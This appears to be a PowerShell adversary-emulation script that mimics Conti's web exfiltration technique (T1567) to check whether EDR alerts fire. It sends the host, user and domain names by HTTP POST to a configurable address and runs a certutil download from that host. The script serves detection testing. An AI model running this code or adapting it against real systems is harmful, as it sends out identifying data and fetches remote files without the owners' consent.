<#
.SYNOPSIS
    Conti Web Exfiltration - DETECTION TRIGGER
.DESCRIPTION
    Exfiltrates test data via HTTP POST.
    Will trigger EDR detection for T1567.
    TTP: T1567
.PARAMETER ExfilURL
    Target URL for data exfiltration
#>
param(
    [Parameter(Mandatory=$false)]
    [string]$ExfilURL = "http://10.0.0.1:8080/upload"
)

Write-Host "[*] Starting Conti Web Exfiltration (T1567)" -ForegroundColor Cyan
Write-Host "[*] Target URL: $ExfilURL" -ForegroundColor Yellow
Write-Host "[*] This will trigger EDR detection for exfiltration" -ForegroundColor Yellow

try {
    # Create test data to exfiltrate
    $testData = @{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        domain = $env:USERDOMAIN
        timestamp = (Get-Date).ToString()
        data = "RTL Test Exfiltration - EDR Detection Validation"
    }
    
    $jsonData = $testData | ConvertTo-Json
    
    Write-Host "[*] Test data prepared:"
    Write-Host $jsonData
    
    # ACTUAL DETECTION TRIGGER - HTTP POST exfiltration
    Write-Host "`n[*] Executing: Invoke-WebRequest -Uri $ExfilURL -Method POST"
    
    try {
        $response = Invoke-WebRequest -Uri $ExfilURL -Method POST -Body $jsonData -ContentType "application/json" -TimeoutSec 5 -ErrorAction SilentlyContinue
        Write-Host "[+] HTTP POST completed (Status: $($response.StatusCode))" -ForegroundColor Green
    } catch {
        Write-Host "[-] HTTP POST failed (expected if no server): $_" -ForegroundColor Yellow
        Write-Host "[*] Detection still triggers on the attempt" -ForegroundColor Cyan
    }
    
    # Also try using certutil for download (common exfil/download evasion)
    Write-Host "`n[*] Also testing certutil download technique..."
    $certutilTarget = "$env:TEMP\rtl_certutil_test.txt"
    
    # Create a test URL (will fail but triggers detection)
    $testURL = "http://$(($ExfilURL -split '//')[1] -split '/')[0]/test.txt"
    Write-Host "[*] Executing: certutil -urlcache -split -f $testURL"
    
    certutil -urlcache -split -f $testURL $certutilTarget 2>&1 | Out-Null
    
    # Cleanup
    Remove-Item $certutilTarget -Force -ErrorAction SilentlyContinue
    
    Write-Host "[!] CrowdStrike should detect: 'DataExfiltration' or 'SuspiciousHTTPActivity'" -ForegroundColor Magenta
    
} catch {
    Write-Host "[!] Error: $_" -ForegroundColor Red
}

Write-Host "`n[*] Detection should appear in CrowdStrike within 1-2 minutes" -ForegroundColor Cyan
